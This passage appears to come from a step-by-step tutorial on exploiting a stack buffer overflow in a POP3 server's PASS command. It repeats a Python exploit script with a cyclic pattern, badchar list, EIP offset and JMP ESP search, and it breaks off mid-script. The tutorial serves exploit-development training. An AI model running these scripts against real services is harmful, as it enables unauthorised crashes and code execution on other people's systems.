pattern += "3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3B"   #ADD
pattern += "t4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4"   #ADD
pattern += "Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx"   #ADD
pattern += "5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5B"   #ADD
pattern += "z6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6"   #ADD
pattern += "Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd"   #ADD
pattern += "7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7C"   #ADD
pattern += "f8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8"   #ADD
pattern += "Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj"   #ADD
pattern += "9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9C"   #ADD
pattern += "m0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0"   #ADD
pattern += "Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq"   #ADD
pattern += "1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1C"   #ADD
pattern += "s2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2"   #ADD
pattern += "Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw"   #ADD
pattern += "3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3C"   #ADD
pattern += "y4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4"   #ADD
pattern += "Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc"   #ADD
pattern += "5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5D"   #ADD
pattern += "e6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6"   #ADD
pattern += "Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di"   #ADD
pattern += "7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7D"   #ADD
pattern += "k8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"                              #ADD

#
# PAYLOAD
# Paste msfvenom command next line, payload info beneath, then payload.
# 

#################### Exploit
# Target crashes at "A" * 2700____________________ (# bytes: qty of char "A")
# Badchars: "\x00\x19\x1a\x1b\x1c"________________ (\xXX hex string)          #MOD
# Pattern-generated EIP: _________________________ (4 bytes in hex)
# Specific offset (splat) is _____________________ (# bytes)
# Usable JMP ESP at ______________________________ (little-endian hex addr)

sploit  = ""
sploit += ""           # protocol reqts
sploit += ""           # badchar test                                         #MOD
sploit += pattern      # pattern_create                                       #MOD
sploit += "A" * 2700   # splat
sploit += ""           # eip
sploit += ""           # nopsled
sploit += ""           # payload
sploit += ""           # nopsled

#################### Communication

# Standup
printinfo(["Creating socket ..."])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
printinfo(["Connecting to", ip, "on port", port, "..."])
connect = s.connect((ip, port))
s.recv(1024)

# Interact
printinfo(["Sending username \"test\" ..."])
s.send('USER test\r\n')
s.recv(1024)
printinfo(["Sending password of", len(sploit), "bytes..."])
s.send('PASS ' + sploit + '\r\n')

# Result
printresult(["Exploit sent. Attack complete."])

# Teardown
printinfo(["Quitting connection."])
s.send('QUIT\r\n')
s.close()
```

Run the exploit script.

```
root@kali:~# python sploit.py
```

In the test system's debugger, identify the four bytes inside the EIP register. In this example, let's say the debugger shows `41633341`. We should convert this to ASCII characters (the format Metasploit's pattern_create script used). We have numerous methods to convert hex to ASCII/UTF-8 and back: we could use an online converter (<http://www.asciitohex.com> is my go-to), a CLI converter, or our simple ASCII/UTF-8 charts. Let's look at an ASCII chart.

```
                     The 128 ASCII characters
                     ========================

Oct   Dec   Hex   Char                        Oct   Dec   Hex   Char   
────────────────────────────────────────────────────────────────────────
000   0     00    NUL '\0' (null character)   100   64    40    @
001   1     01    SOH (start of heading)      101   65    41    A
002   2     02    STX (start of text)         102   66    42    B
003   3     03    ETX (end of text)           103   67    43    C
004   4     04    EOT (end of transmission)   104   68    44    D
005   5     05    ENQ (enquiry)               105   69    45    E
006   6     06    ACK (acknowledge)           106   70    46    F
007   7     07    BEL '\a' (bell)             107   71    47    G
010   8     08    BS  '\b' (backspace)        110   72    48    H
011   9     09    HT  '\t' (horizontal tab)   111   73    49    I
012   10    0A    LF  '\n' (new line)         112   74    4A    J
013   11    0B    VT  '\v' (vertical tab)     113   75    4B    K
014   12    0C    FF  '\f' (form feed)        114   76    4C    L
015   13    0D    CR  '\r' (carriage ret)     115   77    4D    M
016   14    0E    SO  (shift out)             116   78    4E    N
017   15    0F    SI  (shift in)              117   79    4F    O
020   16    10    DLE (data link escape)      120   80    50    P
021   17    11    DC1 (device control 1)      121   81    51    Q
022   18    12    DC2 (device control 2)      122   82    52    R
023   19    13    DC3 (device control 3)      123   83    53    S
024   20    14    DC4 (device control 4)      124   84    54    T
025   21    15    NAK (negative ack.)         125   85    55    U
026   22    16    SYN (synchronous idle)      126   86    56    V
027   23    17    ETB (end of trans. blk)     127   87    57    W
030   24    18    CAN (cancel)                130   88    58    X
031   25    19    EM  (end of medium)         131   89    59    Y
032   26    1A    SUB (substitute)            132   90    5A    Z
033   27    1B    ESC (escape)                133   91    5B    [
034   28    1C    FS  (file separator)        134   92    5C    \  '\\'
035   29    1D    GS  (group separator)       135   93    5D    ]
036   30    1E    RS  (record separator)      136   94    5E    ^
037   31    1F    US  (unit separator)        137   95    5F    _
040   32    20    SPACE                       140   96    60    `
041   33    21    !                           141   97    61    a
042   34    22    "                           142   98    62    b
043   35    23    #                           143   99    63    c
044   36    24    $                           144   100   64    d
045   37    25    %                           145   101   65    e
046   38    26    &                           146   102   66    f
047   39    27    '                           147   103   67    g
050   40    28    (                           150   104   68    h
051   41    29    )                           151   105   69    i
052   42    2A    *                           152   106   6A    j
053   43    2B    +                           153   107   6B    k
054   44    2C    ,                           154   108   6C    l
055   45    2D    -                           155   109   6D    m
056   46    2E    .                           156   110   6E    n
057   47    2F    /                           157   111   6F    o
060   48    30    0                           160   112   70    p
061   49    31    1                           161   113   71    q
062   50    32    2                           162   114   72    r
063   51    33    3                           163   115   73    s
064   52    34    4                           164   116   74    t
065   53    35    5                           165   117   75    u
066   54    36    6                           166   118   76    v
067   55    37    7                           167   119   77    w
070   56    38    8                           170   120   78    x
071   57    39    9                           171   121   79    y
072   58    3A    :                           172   122   7A    z
073   59    3B    ;                           173   123   7B    {
074   60    3C    <                           174   124   7C    |
075   61    3D    =                           175   125   7D    }
076   62    3E    >                           176   126   7E    ~
077   63    3F    ?                           177   127   7F    DEL

For convenience, below are more compact tables in hex and decimal.

      2 3 4 5 6 7       30 40 50 60 70 80 90 100 110 120
    -------------      ---------------------------------
   0:   0 @ P ` p     0:    (  2  <  F  P  Z  d   n   x
   1: ! 1 A Q a q     1:    )  3  =  G  Q  [  e   o   y
   2: " 2 B R b r     2:    *  4  >  H  R  \  f   p   z
   3: # 3 C S c s     3: !  +  5  ?  I  S  ]  g   q   {
   4: $ 4 D T d t     4: "  ,  6  @  J  T  ^  h   r   |
   5: % 5 E U e u     5: #  -  7  A  K  U  _  i   s   }
   6: & 6 F V f v     6: $  .  8  B  L  V  `  j   t   ~
   7: ' 7 G W g w     7: %  /  9  C  M  W  a  k   u  DEL
   8: ( 8 H X h x     8: &  0  :  D  N  X  b  l   v
   9: ) 9 I Y i y     9: '  1  ;  E  O  Y  c  m   w
   A: * : J Z j z
   B: + ; K [ k {
   C: , < L \ l |
   D: - = M ] m }
   E: . > N ^ n ~
   F: / ? O _ o DEL
   
   Hex format:               Dec format:
   hex(X) = \xCol#Row#       dec(X) = Col# + Row# 
   ex: hex(A) = \x41         ex: dec(A) = 60 + 5 = 65
```

*Don't get confused between the decimal and hex values!*

The EIP contains hex value `41633341`, or `\x41 \x63 \x33 \x41`, which corresponds to ASCII string `Ac3A`. Let's use Metasploit's companion script, pattern_offset.rb, to determine the offset for this example. If it doesn't work, reverse the order of the characters--little endian stuff.

```
root@kbox:~# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2700 -q Ac3A
  [*] Exact match at offset 69
```

The script returns an integer, which is *the number of buffer ("splate") bytes* ***before*** *any data enters the EIP*. This value does not count any protocol-specific bytes, as those were sent before the buffer pattern was sent. In other words, we can place whatever we want in the 32-bit EIP register if we send `protocol string` + `69 splat bytes` + `4 EIP bytes`.

### [2] Test EIP control and assess payload space.

In this step, we'll modify our script to place 4 Bs (`\x42`) in the EIP, followed by 375 Cs (`\x43`) and about 2000 Ds (`\x44`). We do this in order to ensure our offset (splat) is correct and to ensure we have at least 375 bytes of payload space in the stack after the 4 EIP bytes.

```
root@kali:~# vim sploit.py
```

```
#!/usr/bin/python

import socket, sys

#################### gsstyle
from colorama import Fore, Back, Style
colorama.init()

def printinfo(output):
  print Style.DIM + "[*] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printresult(output):
  print Style.BRIGHT + Fore.BLUE + "[>] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printalert(output):
  print Style.BRIGHT + Fore.RED + "[!] ",
  for field in output:
    print field,
  print Style.RESET_ALL

#################### Help section
if len(sys.argv) != 2:
  print "Usage: ./sys.argv[0] <ip.addr>"
  print
  print "ARGUMENT        FORMAT  DESCRIPTION"
  print " <ip.addr>       IPv4    IP address of host you want to test."
  print
  sys.exit(0)

#################### Variables
ip = sys.argv[1]   # string argument
port = 110         # int

# Initialize string of UTF hex values \x01 thru \xff for badchar testing:
chars  =     "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
chars += "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
chars += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
chars += "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
chars += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
chars += "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
chars += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
chars += "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
chars += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
chars += "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
chars += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
chars += "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
chars += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
chars += "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
chars += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
chars += "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#
# PATTERN
# Paste pattern_create command next line and pattern beneath.
# echo -n "pattern  = "; ./pattern_create.rb -l 2700 | sed 's/.*/\"&\"/' |\
# sed 's/.\{62\}/&\"\npattern\ \+\=\ \"/g'
pattern  = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9A"
pattern += "c0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0"
pattern += "Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag"
pattern += "1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1A"
pattern += "i2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2"
pattern += "Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am"
pattern += "3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3A"
pattern += "o4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4"
pattern += "Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As"
pattern += "5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5A"
pattern += "u6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6"
pattern += "Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay"
pattern += "7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7B"
pattern += "a8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8"
pattern += "Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be"
pattern += "9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9B"
pattern += "h0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0"
pattern += "Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl"
pattern += "1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1B"
pattern += "n2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2"
pattern += "Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br"
pattern += "3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3B"
pattern += "t4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4"
pattern += "Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx"
pattern += "5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5B"
pattern += "z6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6"
pattern += "Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd"
pattern += "7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7C"
pattern += "f8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8"
pattern += "Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj"
pattern += "9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9C"
pattern += "m0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0"
pattern += "Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq"
pattern += "1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1C"
pattern += "s2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2"
pattern += "Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw"
pattern += "3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3C"
pattern += "y4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4"
pattern += "Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc"
pattern += "5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5D"
pattern += "e6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6"
pattern += "Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di"
pattern += "7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7D"
pattern += "k8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"

#
# PAYLOAD
# Paste msfvenom command next line, payload info beneath, then payload.
# 

#################### Exploit
# Target crashes at "A" * 2700____________________ (# bytes: qty of char "A")
# Badchars: "\x00\x19\x1a\x1b\x1c"________________ (\xXX hex string)
# Pattern-generated EIP: "Ac3A"___________________ (4 bytes in hex)           #MOD
# Specific offset (splat) is 69___________________ (# bytes)                  #MOD
# Usable JMP ESP at ______________________________ (little-endian hex addr)

sploit  = ""
sploit += ""           # protocol reqts
sploit += ""           # badchar test
sploit += ""           # pattern_create                                       #MOD
sploit += "A" * 69     # splat                                                #MOD
sploit += "B" * 4      # eip                                                  #MOD
sploit += ""           # nopsled
sploit += ("C" * 375) + ("D" * 2000)    # payload                             #MOD
sploit +=              # nopsled

#################### Communication

# Standup
printinfo(["Creating socket ..."])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
printinfo(["Connecting to", ip, "on port", port, "..."])
connect = s.connect((ip, port))
s.recv(1024)

# Interact
printinfo(["Sending username \"test\" ..."])
s.send('USER test\r\n')
s.recv(1024)
printinfo(["Sending password of", len(sploit), "bytes..."])
s.send('PASS ' + sploit + '\r\n')

# Result
printresult(["Exploit sent. Attack complete."])

# Teardown
printinfo(["Quitting connection."])
s.send('QUIT\r\n')
s.close()
```

Run the exploit script.

```
root@kali:~# python sploit.py
```

The program should crash with EIP set to `42424242`. Analyze the stack and look for several ASCII Ds, or `\x44`. If you see at least some of your Ds, then you can assume all 375 Cs made it onto the stack, which indicates you have at least 375 bytes of space for your payload. If you don't see those Ds, then count the Cs to determine how much space you have. You really want to have 350 bytes or more of space for a post-EIP payload. (Otherwise, you'll have to place your payload in the splat (offset) portion of your buffer data and add a JMP back to the start of the payload's nopsled.)

At this point in the scenario, we have controlled the EIP, filling it with the 4 Bs, and we have all 375 Cs on the stack. We're almost ready to proceed.

Part IV: Redirect execution flow.
================================================================================

### Discussion

Even though our payload can be written to a memory space easily accessed by the ESP
register, we can't hardcode that address because it changes based on what the operating system allocates to the program each time it is run. Instead, we need to find a `JMP ESP` instruction in some reliable, accessible address in memory.

### [1] Find a module.

Use Immunity's mona script, which looks at modules loaded in memory. Type the
following command in Immunity and search for any module with no DEP, no ASLR, and no bad characters in the memory range. It should also have stable memory addresses when loaded. `Rebase`, `SafeSEH`, `ASLR`, and `NXCompat` should all be `false`. In the debugger:

```
!mona modules
```

### [2] Find the instruction.

Note the memory location (entry under `Base` column) for the module you picked. Open
the memory view and scroll to that memory location. You should see the various segments of the module listed next to their memory addresses.

If the application were compiled with DEP support, we would be limited to `JMP ESP`
addresses inside the code (.text) segment, which has both read (R) and execute (E)
permissions. Since the more-intensive search beyond the .text segment (which you can do for cases with no DEP support) is more detailed, let's do that. 

This means we need to run a binary search for the `JMP ESP` opcode equivalent. Use Metasploit's NASM Shell script to get the opcode equivalent.

```
root@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
  nasm > jmp esp
  00000000  FFE4    jmp esp
```

So we are looking for the opcode `FFE4` or `\xff\xe4` in the selected module. Search for that opcode in all sections of the selected module using Mona:

```
!mona find -s "\xff\xe4" -m <module name>
```

Choose one of the resulting addresses that has no bad characters in it, and
double-check the contents of the address in the debugger to confirm it does, in fact,
hold a `JMP ESP` instruction. Record that address.

### [3] Place selected JMP ESP address into EIP.

Replace the four EIP bytes in your script with the address reversed (last byte first
and first byte last). You're reversing the byte order because x86 uses little endian format.

If the address were `0x65d11d71`, or `\x65\xd1\x1d\x71`, then you'd replace your script’s four-byte EIP value with `\x71\x1d\xd1\x65`.

```
root@kali:~# vim sploit.py
```

```
#!/usr/bin/python

import socket, sys

#################### gsstyle
from colorama import Fore, Back, Style
colorama.init()

def printinfo(output):
  print Style.DIM + "[*] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printresult(output):
  print Style.BRIGHT + Fore.BLUE + "[>] ",
  for field in output:
    print field,
  print Style.RESET_ALL

def printalert(output):
  print Style.BRIGHT + Fore.RED + "[!] ",
  for field in output:
    print field,
  print Style.RESET_ALL

#################### Help section
if len(sys.argv) != 2:
  print "Usage: ./sys.argv[0] <ip.addr>"
  print
  print "ARGUMENT        FORMAT  DESCRIPTION"
  print " <ip.addr>       IPv4    IP address of host you want to test."
  print
  sys.exit(0)

#################### Variables
ip = sys.argv[1]   # string argument
port = 110         # int

# Initialize string of UTF hex values \x01 thru \xff for badchar testing:
chars  =     "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
chars += "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
chars += "\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
chars += "\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
chars += "\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
chars += "\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
chars += "\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
chars += "\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
chars += "\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
chars += "\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
chars += "\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
chars += "\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
chars += "\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
chars += "\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
chars += "\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
chars += "\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

#
# PATTERN
# Paste pattern_create command next line and pattern beneath.
# echo -n "pattern  = "; ./pattern_create.rb -l 2700 | sed 's/.*/\"&\"/' |\
# sed 's/.\{62\}/&\"\npattern\ \+\=\ \"/g'
pattern  = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9A"
pattern += "c0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0"
pattern += "Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag"
pattern += "1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1A"
pattern += "i2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2"
pattern += "Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am"
pattern += "3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3A"
pattern += "o4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4"
pattern += "Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As"
pattern += "5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5A"
pattern += "u6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6"
pattern += "Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay"
pattern += "7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7B"
